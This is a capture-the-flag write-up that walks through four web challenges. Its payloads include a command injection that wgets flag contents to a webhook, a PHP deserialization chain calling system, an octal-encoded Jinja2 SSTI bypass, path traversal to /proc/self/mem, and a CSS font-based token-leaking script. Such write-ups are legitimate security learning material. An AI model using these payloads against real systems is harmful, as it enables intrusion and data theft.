---
title: "WannaGame"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2024-08-27
draft: false
authors:
  - Hibwyli
---
# Write ups WannaGame

# Dox List: 
## Source code : 
CVE-2024-42352:
https://nvd.nist.gov/vuln/detail/CVE-2024-42352

Server : 
```python
@app.route('/health_check')
def health_check():
    cmd = request.args.get('cmd') or 'ping'
    health_check = f'echo \'db.runCommand("{cmd}").ok\' | mongosh mongodb:27017/app --quiet'
    try:
        result = subprocess.run(health_check, shell=True, capture_output=True, text=True, timeout=2)
        app.logger.info(result)
        return 'Database is responding' if '1' in result.stdout else 'Database is not responding'
    except subprocess.TimeoutExpired:
        return 'Database is not responding'
@app.route('/api/dogs')
def get_dogs():
    app.logger.info(f"Requests Header : {request.headers}")
    dogs = []
    for dog in app_db['doxlist'].find():
        dogs.append({
            "name": dog['name'],
            "image": dog['image']
        })
    return jsonify(dogs)

```
We have two routes, one for get data from db and one to call a command with subprocess.run. 
Because it is running with : shell = True so we can use something like :  `cat /flag*` to receive the flag and call to our web hooks.

Client : 
```javascript
<script setup>
import { ref, onMounted } from 'vue';
const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
const cards = ref(new Array(8))
const { data, error } = await useAsyncData('fetchDox', async () => {
  try {
    const response = await $fetch('http://backend:5000/api/dogs')
    console.log(response)
    return response
  } catch (err) {
    console.error('Error fetching data:', err)
    return cards;
  }

})

onMounted(async () => {
  console.log(data)
  if (data) cards.value = data.value;
  console.log(cards)
});
```
Well it looks like server just call to the the "/api/dogs"... Im trying to figure out some way to ssrf this app and its too hard. So we have a hint from authors
 ![image](https://hackmd.io/_uploads/ryfeZTm8kx.png)

So now , we just need to find a CVE which we can just check version of packages in our app.
```json=
  "dependencies": {
    "@nuxt/icon": "1.4.4",
    "@nuxtjs/proxy": "^2.1.0",
    "nuxt": "^3.13.0",
    "vue": "latest",
    "vue-router": "latest"
  },
```
Ye , there is only one unupdated is @nuxt/icon. Search on google and we will find this.
![image](https://hackmd.io/_uploads/SJW_ZpQUyl.png)

And we try to test this on our app.
![image](https://hackmd.io/_uploads/S1ni-pQLyx.png)
Now we can call to the route right ??? Nope, its seem impossible

![image](https://hackmd.io/_uploads/r1sJGp78Je.png)
Look at the implementation of url parse we can know the reason why.![image](https://hackmd.io/_uploads/H1L-zT78kl.png)
- Our url will be catched with the basename "/" and then i tried some bypass with "\" and "%5C" but it is impossilbe so we need to find another way. Take a breathe, and we can control the place our server will redirect to right ? 
- So the idea is really simple !!! Make it redirect to our own app !!! And we can just redirect it back to its route ("/health_check")
# Implement own server 
```python
from flask import Flask,request,redirect
import requests
app = Flask(__name__)

@app.route('/')

def home():
    return redirect("http://backend:5000/health_check?cmd=%22%29%27%3Bwget%20https%3A%2F%2Fwebhook.site%2F8e85705e-3468-4e1f-90b5-745c2a70b808%3Fq%3D%24%28cat%20%2Fflag%2A%29%20%3Becho%20%271%27%3B%23%20")

if __name__ == '__main__':
    app.run(debug=True)  # This runs the app locally
```
Host this app up and we will receive the flag at our webhook !!
![image](https://hackmd.io/_uploads/r15E767LJl.png)

![image](https://hackmd.io/_uploads/HkrE76Q8ke.png)
Im sorry for not showing the real flag because I dont know why i cannot access it anymore :<.

# My Restaurant 
Insecure Deserialization
## Overview
```php
class Spaghetti
{
    public $sauce;
    public $noodles;
    public $portion;

    public function __get($tomato)
    {
        ($this->sauce)();
    }
}
```
```php
class Pizza
{
	public $price;
	public $cheese;
	public $size;

	public function __destruct()
	{
		echo $this->size->what;
    }    
}    
```
```php

<?php
	class IceCream
	{
		public $flavors;
		public $topping;

		public function __invoke()
		{
			foreach ($this->flavors as $flavor) {
				echo $flavor;
			}
		}
	}
```
This challenge gives us 3 class and this is 100% a PHP deserialization challenge !! So we need to find some ways to chain these vulnerabilities.
I rearranged for easier explanation.

- First class is Spaghetti use method `__get($tomato)` is a method get called when we get access into a undefined attribute of that class. And it will run the function at `sauce`
- Second class is Pizza use method `__destruct` is a method get called when this class is destructed. Then it will call to the `$size->what`.
- Final class IceCream use method `__invoke` is a method get called when get called like `$ice();`. It will loops and print the flavors array.
## What we can chain here ? 
- Look at the Pizza, it will access to an undefined variables `what` right? So if we set our `$size` is a object of `Spaghetti` which has `__get($tomato)` get called when access to undefined attribute ? We can chain these together then we can run the `$sauce` of Spaghetti.
- What the `$sauce` should be ? It is clear is the `IceCream` !!! And it will run the `__invoke` and print its flavors !!!
## What flavors we want  ? 
- So now we can make some chain, to finally run the  `__invoke` to print out all flavors.
- Well a `$flavors` in IceCream is just an  array and in the source code we have something interesting : 
```php
<?php

namespace Helpers{
    use \ArrayIterator;
	class ArrayHelpers extends ArrayIterator
	{
		public $callback;

		public function current()
		{
			$value = parent::current();
			echo $value;
			$debug = call_user_func($this->callback, $value);
			return $value;
		}
	}
}

```
This creates a Helpers Array which add a function when get looped with forEach. It will loop through the `values` in array and call a callback with argument is that value !!!! Which is so suitable to create our `$flavours` right ? Because  the `$flavours` get looped too !!.
```php
	foreach ($this->flavors as $flavor) {
	    echo $flavor;
        }
```
# Full steps : 
```php
	$pizza = new Pizza();
	$spa = new Spaghetti();
	$ice  = new IceCream();
    //Set the values is a malicous code
	$arrayHel = new ArrayHelpers(["cat /*.txt"]);  
    // Set callback to system function to exec code
	$arrayHel->callback="system";
    // Chain methods
	$ice->flavors = $arrayHel;
	$spa->sauce  = $ice;
	$pizza->size = $spa;
	echo serialize($pizza);
	echo base64_encode(serialize($pizza));
```
Test it on burp suite we get : 
![image](https://hackmd.io/_uploads/r10KJAmU1x.png)
- Hmmm it seems not get the ArrayHelpers instance because this class comes from another file. Just fix a little bit with : 
 ![image](https://hackmd.io/_uploads/BkQp1RX8ke.png)
 Run again and get the flag !!!!
 ![image](https://hackmd.io/_uploads/rkvR1CmUJl.png)

# SSTI FOR KIDS : 
```python
def check_payload(payload):
    forbidden_chars = ["[", "]", "_", ".", "x", "dict", "config", "mro", "popen", "debug", "cycler", "os", "globals", "flag", "cat"]
    # [] , 
    payload = payload.lower()
    for char in forbidden_chars:
        if char in payload:
            print(f"CAUGHT {char}")
            return True
    return False
```
This challenge need us to bypass SSTI checker.
After reading this [blog](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
- I found a powerful payload : 
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
But it stills get caught with `x` letter so just convert all of them into octal form :>>
```python
{{request|attr('application')|attr('\137\137globals\137\137')|attr('\137\137getitem\137\137')('\137\137builtins\137\137')|attr('\137\137getitem\137\137')('\137\137import\137\137')('os')|attr('popen')('id')|attr('read')()}}
```
Then change some blackwords too:
Final : 
```python
{{request|attr('\141pplic\141ti\157n')|attr('\137\137glob\141ls\137\137')|attr('\137\137getitem\137\137')('\137\137builtins\137\137')|attr('\137\137getitem\137\137')('\137\137imp\157rt\137\137')('\157s')|attr('p\157pen')('c\141t fl\141g*')|attr('re\141d')()}}
```
Ten ten ten: ![image](https://hackmd.io/_uploads/BkUCfAQL1e.png)


# Nemo
Logic and read memories 

# Source  Back End: 
```python
class FileMetadata:
    def __init__(
            self,
            author,
            filename,
            description,
            id = None,
    ):
        if len(author) > 50 or \
           len(filename) > 50 or \
           len(description) > 150:
            raise StringTooLongException()
        self.creation_time = datetime.now(tz=timezone.utc)

        self.author = author
        self.filename = filename
        self.init = id in forbidden_ids
        basedir = "/company" if self.init else "/tmp"
        self.path = f"{basedir}/{filename}"
        self.description = description
        self.id = str(UUID(id, version=4)) if id is not None else str(uuid4())

    def write(self, collection, content):
            raise ValueError("Use of forbidden id")

        collection.insert_one(vars(self))
        if "./" in self.path:
            raise PathTraversalAttemptDetectedException()
        if len(content) > 200:
            raise FileTooBigException()
        with open(self.path, "w") as f:
            f.write(content)
    def read(self, offset, length):
        with open(self.path, "rb") as f:
            f.seek(offset)
            return f.read(length)
```
First it wil create a FileMeta with 2 main functions:
- Write and Read 
There are also some rules need to follow.
First it will check the id given and check if it is forbiddened or not. After that choose a basedir to store that file ('/tmp' or '/company'). Finally initialize a uuid if no id given and check the format of id given. 
- Pay attention that read function using `offset and length` to read a file which looks too weird.
- Well it looks too much information here. But left it and read at the server code .

# Source Handle : 
```python
def initialize_db():
    for f in files:
        m = f["metadata"]
        fm = FileMetadata(
            m["author"],
            m["filename"],
            m["description"],
            id = m["id"],
        )
        if not metadata.find_one({"id": m["id"]}):
            fm.write(metadata, f["content"])
    print(files[-1]["metadata"]["filename"])
    
    if (os.path.exists("init/init_data.py")):
        os.remove("init/init_data.py")

```
First it will generate files with data from a pathname `init/init_data.py` and then delete those file.
And the flag is one of those get deleted.
```python
{
        "metadata": {
            "author": "Shimmering Pearl",
            "filename": "ocean_whispers.txt",
            "description": "The eternal song of the waves.",
            "id": "3dad5070-950c-48c5-bbb2-51312d4a8eab",
        },
        "content": FLAG,
    },
```

Then we have 2 routes handle for read file:
```python
@app.get("/files")
def get_files():
    return [f["metadata"] for f in files]


@app.get("/files/<id>")
def get_file(id):
    if id == "3dad5070-950c-48c5-bbb2-51312d4a8eab":
        return "", 403
    res = metadata.find_one({
        "id": {"$eq": id}
    })
    if res is None:
        return "", 404
    m = FileMetadata(
        res["author"],
        res["filename"],
        res["description"],
        id=res["id"],
    )
        if files[-1]["metadata"]["filename"] in res["filename"]:
        return "", 403
        ######## read offset voi length chi v?????????????##############
    return m.read(int(request.args.get("offset", 0)), int(request.args.get("length", -1)))
```
- We can read any files with the id but not the id of the `flag` as well as the file has the same name of the flag file.

Then is the route to handle uploading files : 
```python
def parse_file(body, id=None):
    import re, string
    ##### VI SAO PHAI CHECK PRINTABLE #######
    CONTENT_CHECK = re.compile(f"[^ {string.printable}]")

    if CONTENT_CHECK.search(body["content"]):
        raise ()
    if len(body["content"]) > 200:
        raise ValueError()
    return {
        "metadata": FileMetadata(
            body["author"],
            body["filename"],
            body["description"],
            id,
        ),
        "content": body["content"]
    }


@app.post("/files")
def post_file():
    body = request.json
    try:
        parsed_body = parse_file(body)
    except (KeyError, ValueError):
        return "", 422
    m = parsed_body["metadata"]
    content = parsed_body["content"]
    m.write(metadata, content)
    r = make_response("", 201)
    # KO CHECK PATH TRAVERSAL
    r.headers["Location"] = f"/api/v1/files/{m.id}"
    return r


@app.put("/files/<id>")
def put_file(id):
    if id in forbidden_ids:
        return "", 403
    body = request.json
    try:
        parsed_body = parse_file(body, id)
    except (KeyError, ValueError):
        return "", 422
    m = parsed_body["metadata"]
    content = parsed_body["content"]
    m.write(metadata, content)
    r = make_response("", 201)
    # KO CHECK PATH TRAVERSAL
    r.headers["Location"] = f"/api/v1/files/{m.id}"
    return r
```
- First is the function parse_file which will receive the body data and id to use that and create a FileMeta Data.
- `Post` and `Put` file function is just different that the Put you can handle id passed into parse_file which the `Post` doesn't.
- But it seems the `PUT` get checked the forbidden_ids too much. Specially 3 times :vv. 
# My  silly ideas: 
The first time, i have though about how can i abuse the `id` which seems a dead end but I want to talk about it a little bit. :v 
My idea is simple that I want to create a file with the same `id` of flag file although I dont have idea why does it :v  and as it takes me long time with no results.
- But i found something weird at the : 
```python
self.id = str(UUID(id, version=4)) if id is not None else str(uuid4())
```
And when test it , i found this :  
![image](https://hackmd.io/_uploads/B1y7414IJx.png)
HEy , HEY it get changed at letter `A` into  `4`
- After researching , I found that at that byte position used to specify the version in variant RFC 4122 UUID. So the implementation try to convert that bytes into the version number .
![image](https://hackmd.io/_uploads/rkhu9bNLkx.png)
- Maybe this can be used to bypass in some challenges :DDD 

# Continue : 
SO it seems `id` is not our playground anymore :v. What can happen here ? 
- After reading too long.. I feel like there is a flaw in the logic code
```python
    def write(self, collection, content):
        if self.id in forbidden_ids and not self.init:
            raise ValueError("Use of forbidden id")

        collection.insert_one(vars(self))
        ## INSERT VAO LUON ROI =))))))
        if "./" in self.path:
            raise PathTraversalAttemptDetectedException()
        if len(content) > 200:
            raise FileTooBigException()
        with open(self.path, "w") as f:
            f.write(content)
```
- It just check the id and then `insert` straight into the model =)))) So we dont actually care about the `filename` get checked by path traversal.
-  As well as the read just need a `filename` and nothing mores :vvv.
```python
def read(self, offset, length):
        # Write duoc 1 filename co filename la path traversal -> lay id -> bo vao ham get -> READ EVERYTHING
        with open(self.path, "rb") as f:
            f.seek(offset)
            return f.read(length)
```
... As well as the routes handling.
# New ideas: 
So what if I create a malicous filename to every file I want and then read that id ? I will receive the data from that file:DD.

- Now let's try read `/etc/passwd` with these steps .

![image](https://hackmd.io/_uploads/Sk_ddyE8yl.png)
It will be error because of geting caught by `path traversal` but I dont care :>
- Then read with our id !! 
![image](https://hackmd.io/_uploads/ryYAukV8yl.png)
 
 # Read what to get the flag ? 
 - Well it seems the file is deleted by the python and not anymore. But it actually still lives in `memory`. And in linux to debug the memories we need to read at `/proc/self/mem`.
 - Because it is a virtual file , it means it is created at the time we read it so to read it we need an `offset` and `length`, now we know the reason of them in read function ~~ 
 ## How to find an offset 
- Ye, we have a friends called `/proc/self/maps` which will list all memory regions. Let's get them now ! 
- We will get a bunch of offset.
![image](https://hackmd.io/_uploads/Sy8hqy4IJl.png)

 *It will easier to read :v
 Then do the same steps to read into file `/proc/self/mem` with offset and length 
 ## FINALLY :::
 ![image](https://hackmd.io/_uploads/HyRNaJNUJe.png)
- You will find it <333

# Art-Gallery
## Overview 
- Main goals : 
We need to stole 2 types of token : SECURITY_TOKEN and SECRET_TOKEN.  Use this to get access as admin and get the Flag stored at `/admin`
# SECRET_TOKEN : 
This is really clear how to stole this. 
```python
app.get('/api/update', auth, debug, csp, (req, res) => {
    if (req.user.role === 'admin' && (req.ip === '::1' || req.ip === "127.0.0.1" || req.ip === "::ffff:127.0.0.1")) {
        var username = req.query.username;
        // Grant developer role
        console.log(username, " is now a developer");
        users.get(username).role = 'developer';
    } else {
        return res.status(403).send('Forbidden');
    }

});

// Developer Zone

app.get('/api/dev', auth, csp, debug, (req, res) => {
    if (req.user.role === 'developer' || req.user.role === 'admin') {
        return res.send('JWT_SECRET: ' + JWT_SECRET);
    } else {
        return res.status(403).send('Forbidden');
    }
});

```
- Well a users can get the `SECRET_TOKEN` with developer role is powered by the admin. But it actually just use the `GET` and we can abuse the function report to achive this goal.
```python
app.post('/report', auth, apiLimiter, async (req, res) => {
    var url = req.body.url;
    if (!url) {
        return res.status(404).json({
            message: 'Not found'
        });
    }
    if (!url.startsWith('http://localhost:1337/view/')) {
        return res.json({
            success: false,
            message: 'Nice try kiddo!'
        });
    }
    console.log("visiting url: ", url);
    try {
        visit(url);
    } catch (error) {
        console.log(error);
    }
    return res.json({
        success: true,
        message: 'Report sent successfully'
    });
});
```
Here is poc :  
1. Turn on debug with route `/api/debug?debug_mode=1`
![image](https://hackmd.io/_uploads/r1ogexELJg.png)
2. Update role user with route `/api/update?username=123`
![image](https://hackmd.io/_uploads/BJKoygVUJg.png)
3. And stole it with with `/api/dev`(you will need to login again)
![image](https://hackmd.io/_uploads/Hkvvxl4L1l.png)
- Now we stole the the SECRET_KEY !!!

# How to steal the SECURITY_TOKEN  : 
- Maybe you will think about the report function and lead the page to a XSS page and get the cookies. But it is not the case in this challenge because the cookies are protected. So how we leak the `SECURITY_TOKEN`.
- Read the source code you will see some malicous .
```javascript
app.use((req, res, next) => {
    // Should be safe right?
    if (!req.theme) {
        const theme = req.query.theme;
       if (theme && !theme.includes("<") && !theme.includes(">")) {
            req.theme = theme;
        }else{
            req.theme = 'white';
        }
    }
    next();
})
```
- It creates a middleware to pass our query `theme` and put it into a style tag  
```html=
    <style nonce="{{ nonce }}">
        body {
            background: {{theme | safe}};
        }
    </style>
    <h1 class="title
```
- The `safe` makes it injectable. Let me show you an example.
- ![image](https://hackmd.io/_uploads/ry1TbgNLJg.png)

So we have a CSS injection ? And you can pay attention that the `SECURITY_TOKEN` is actually showed in the user interface? Well when learning XSS i found this good [blog](https://aszx87410.github.io/beyond-xss/en/ch2/trust-types/) and I can even leak the `SECURITY_TOKEN` now !!! 
# Idea 
- The leaks is working because of abusing the `@font` with loading an URL when matching a range of UNICODE which can just be a letter too ~~ !!
![image](https://hackmd.io/_uploads/BJtKGxEI1l.png)
- Idea is create many fonts from `a-z0-9` which one will fetch to my Webhook with its char and position .
![image](https://hackmd.io/_uploads/HkjNCNN81g.png)
- I have created a script to automate this.
```python
import time
import requests
import random
import string
from urllib.parse import quote

s = requests.Session()
def generate_random_string(length):
    # Choose from uppercase, lowercase, and digits
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choices(characters, k=length))
    return random_string
baseUrl = r"http://localhost:1337"
data = {
    "username":generate_random_string(4),
    "password":"123"
}
res = s.post(baseUrl+"/register",json=data)
print(res.text)
res = s.post(baseUrl+"/login",json=data)
print(res.text)
token = res.cookies.get('token')
def char_to_unicode(char):
    code_point = ord(char)
    return f"{code_point:02X}"
chars ="abcdefghijklmnopqrstuvwxyz0123456789"
print(chars)
webhook = "https://webhook.site/b7dd4def-ee30-4273-abbd-e7c070ed3d15"
def loadFont(i):
    font = r""
    result = [f"f{char}" for char in chars]
    result_string = r', '.join(result)
    for char in chars:
        font+= r''' @font-face%20{%20font-family:%20"f'''+char+r'''";%20src:%20url(https://webhook.site/b7dd4def-ee30-4273-abbd-e7c070ed3d15/?q='''+char+str(i)+r''');%20unicode-range:%20U%2b'''+char_to_unicode(char)+''';%20}'''
    font+=r'''.SECURITY_TOKEN%20:nth-child('''+str(i)+r'''){color:red;font-family:'''+result_string+r''',Arial'''
    return font
loadFont(1)
def leak(i):
    data={"url":baseUrl+r'''/view/../profile?theme=white;:}'''+loadFont(i)}
    res=s.post(baseUrl+'/report',json=data,cookies={"token":token})
    print(res.text)


for i in range(2,22):
    leak(i)
```
FOUND local : ditmbzpvkkm7ow85qjz

FOUND server: b3zjagxhqzwarjzfjkj

- Then just use JWT token and login as admin :DDD. Game end. <3 <3 <3 


# Conclusion.
- I want to say thank you to all the authors who spends time creating such a great challenge. I learned a lots from these and its good chance to try my self to the best !!!